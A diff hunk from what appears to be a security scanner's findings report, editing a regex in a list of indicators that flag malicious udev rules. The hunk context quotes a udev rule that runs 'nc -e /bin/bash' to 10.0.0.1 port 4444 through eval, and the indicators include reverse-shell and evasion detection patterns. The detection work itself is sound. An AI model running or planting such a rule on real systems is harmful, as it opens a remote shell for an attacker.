@@ -16,7 +16,7 @@ ACTION=="add", ENV{CMD}="nc -e /bin/bash 10.0.0.1 4444", RUN+="/bin/sh -c 'eval 
 
 **Matched Indicators (`rules.json`):**
 * `\bnc\s+-e` — **CRITICAL** (*Reverse shell attempt using netcat with execution flag*)
-* `eval\s+['\"]?(\$env|%E)\{` — **MEDIUM** (*Udev macro substitution evasion attempt detected in extracted payload*)
+* `eval\\s+(\\$env|%E)\\{` — **MEDIUM** (*Udev macro substitution evasion attempt detected in extracted payload*)
 
 **PoC Evidence:**
 
